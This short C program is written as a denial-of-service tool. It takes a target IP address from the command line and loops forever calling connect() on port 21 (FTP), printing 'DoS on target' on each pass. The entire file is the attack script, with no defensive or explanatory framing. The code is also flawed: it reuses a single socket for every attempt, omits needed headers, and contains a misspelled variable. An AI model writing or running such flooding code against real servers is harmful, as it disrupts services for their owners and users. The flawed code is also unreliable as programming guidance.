#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stdbool.h>

int main(int argc, char *argv[]){

    int sock;
    int connection;
    char *destnation;
    destnation = argv[1];

    struct sockaddr_in target;

    
    
    sock = socket (AF_INET, SOCK_STREAM, 0);
    target.sin_family = AF_INET;
    target.sin_port = htons (21);
    target.sin_addr.s_addr = inet_addr(destnation);

do{
    connection = connect(sock, (struct sockaddr *)&target, sizeof target);
     

        printf ("DoS on target %s\n", destnation);
        
        
} while(true);
            
}